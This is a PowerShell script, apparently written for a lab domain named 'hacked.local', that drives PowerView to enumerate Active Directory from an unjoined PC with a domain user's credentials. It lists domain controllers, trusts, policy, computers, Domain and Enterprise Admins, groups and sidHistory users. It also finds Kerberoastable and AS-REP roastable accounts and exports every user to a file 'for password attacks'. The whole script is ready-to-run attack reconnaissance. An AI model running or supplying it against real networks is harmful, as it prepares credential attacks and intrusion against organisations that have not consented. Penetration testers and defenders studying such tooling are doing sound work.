# This will execute powerview on a non domain joined PC. It will require powershell to be run as a legit domain user

# runas /netonly /user:hacked.local\paul.walton powershell`
# Import-Module .\Recon.psm1`

# Declare variables for domain and domain controller IP address
$domain = "hacked.local"
$domainController = "192.168.15.128"

# Enumerate any domain trusts
Write-Host "Enumerating Domain Trusts..." -ForegroundColor Red
Start-Sleep -Seconds 2
Get-NetDomainTrust -Domain $domain -DomainController $domainController
Read-Host "Press Enter to continue..."
Write-Host "`n"

# Enumerate domain controllers
Write-Host "Enumerating Domain Controllers..." -ForegroundColor Red
Start-Sleep -Seconds 2
Get-DomainController -Domain $domain -DomainController $domainController
Read-Host "Press Enter to continue..."
Write-Host "`n"

# Enumerate domain policy
Write-Host "Enumerating Domain Policy..." -ForegroundColor Red
Start-Sleep -Seconds 2
Get-DomainPolicy -Domain $domain -DomainController $domainController
Read-Host "Press Enter to continue..."
Write-Host "`n"

# Enumerate all domain joined machines
Write-Host "Enumerating Domain joined machines..." -ForegroundColor Red
Start-Sleep -Seconds 2
 Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName -Domain $domain -DomainController $domainController | Sort-Object -Property DnsHostName 
Read-Host "Press Enter to continue..."
Write-Host "`n"

# Find all Domain Admins with name and description
Write-Host "Finding all Domain Admins..." -ForegroundColor Red
Start-Sleep -Seconds 2
Get-DomainGroupMember -Identity 'Domain Admins' -Domain $domain -DomainController $domainController | Select-Object MemberDistinguishedName
Read-Host "Press Enter to continue..."
Write-Host "`n"

# Find all Enterprise Admins with name and description
Write-Host "Finding all Enterprise Admins..." -ForegroundColor Red
Start-Sleep -Seconds 2
Get-DomainGroupMember -Identity 'Enterprise Admins' -Domain $domain -DomainController $domainController | Select-Object MemberDistinguishedName
Read-Host "Press Enter to continue..."
Write-Host "`n"

# Find all user groups with name and description
Write-Host "Finding all User Groups with Name and Description..." -ForegroundColor Red
Start-Sleep -Seconds 2
Get-NetGroup -Domain $domain -DomainController $domainController | Select-Object samaccountname, admincount, description
Read-Host "Press Enter to continue..."
Write-Host "`n"

# Find any users with the SID bit set
Write-Host "Finding Users with SID bit set..." -ForegroundColor Red
Start-Sleep -Seconds 2
Get-NetUser -LDAPFilter '(sidHistory=*)' -Domain $domain -DomainController $domainController
Read-Host "Press Enter to continue..."
Write-Host "`n"

# Find Kerberoastable Users
Write-Host "Finding Kerberoastable Users..." -ForegroundColor Red
Start-Sleep -Seconds 2
Get-NetUser -SPN -Domain $domain -DomainController $domainController
Read-Host "Press Enter to continue..."
Write-Host "`n"

# Find ASREP Roastable Users
Write-Host "Finding ASREP Roastable Users..." -ForegroundColor Red
Start-Sleep -Seconds 2
Get-NetUser -PreAuthNotRequired -Domain $domain -DomainController $domainController
Read-Host "Press Enter to continue..."
Write-Host "`n"

# Find All Domain Users and Export into a text file for password attacks
Write-Host "Finding All Users and Export into a text file for password attacks" -ForegroundColor Red
Start-Sleep -Seconds 2
 Get-DomainUser -Domain $domain -DomainController $domainController | select UserPrincipalName | Out-File -Append "$env:USERPROFILE\Documents\DomainUsers.txt"
Read-Host "Press Enter to continue..."
Write-Host "`n"
 
